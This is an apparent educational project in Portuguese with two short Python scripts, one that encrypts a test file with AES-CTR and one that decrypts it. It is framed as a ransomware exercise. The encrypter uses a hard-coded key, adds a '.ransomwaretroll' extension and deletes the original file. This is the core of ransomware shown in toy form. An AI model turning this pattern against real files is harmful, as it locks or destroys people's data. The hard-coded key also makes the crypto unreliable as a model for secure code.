Desafio de Projeto

Encrypter.py

import os
import pyaes

def encrypt_file(file_path, key):
    """
    Criptografa um arquivo usando a criptografia AES no modo CTR.

    Args:
        file_path (str): O caminho para o arquivo a ser criptografado.
        key (bytes): A chave de criptografia (deve ter 16, 24 ou 32 bytes).
    """

    try:
        with open(file_path, "rb") as file:
            file_data = file.read()

        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)

        encrypted_file_path = file_path + ".ransomwaretroll"
        with open(encrypted_file_path, "wb") as new_file:
            new_file.write(crypto_data)

        os.remove(file_path)  # Remove o arquivo original após a criptografia

        print(f"Arquivo criptografado e salvo como: {encrypted_file_path}")

    except FileNotFoundError:
        print(f"Erro: Arquivo não encontrado: {file_path}")
    except Exception as e:
        print(f"Ocorreu um erro durante a criptografia: {e}")

if __name__ == "__main__":
    file_name = "teste.txt"  # Nome do arquivo a ser criptografado
    key = b"testeransomwares"  # Chave de criptografia (16 bytes)

    encrypt_file(file_name, key)

Decrypter.py

import os
import pyaes

def decrypt_file(file_path, key):
    """
    Descriptografa um arquivo usando a criptografia AES no modo CTR.

    Args:
        file_path (str): O caminho para o arquivo a ser descriptografado.
        key (bytes): A chave de descriptografia (deve ter 16, 24 ou 32 bytes).
    """
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()

        aes = pyaes.AESModeOfOperationCTR(key)
        decrypted_data = aes.decrypt(file_data)

        decrypted_file_path = file_path[:-16]  # Remove a extensão ".ransomwaretroll"
        with open(decrypted_file_path, "wb") as new_file:
            new_file.write(decrypted_data)

        os.remove(file_path)  # Remove o arquivo criptografado após a descriptografia

        print(f"Arquivo descriptografado e salvo como: {decrypted_file_path}")

    except FileNotFoundError:
        print(f"Erro: Arquivo não encontrado: {file_path}")
    except Exception as e:
        print(f"Ocorreu um erro durante a descriptografia: {e}")

if __name__ == "__main__":
    file_name = "teste.txt.ransomwaretroll"  # Nome do arquivo criptografado
    key = b"testeransomwares"  # Chave de descriptografia (16 bytes)

    decrypt_file(file_name, key)

Teste.txt

Esse arquivo está legível
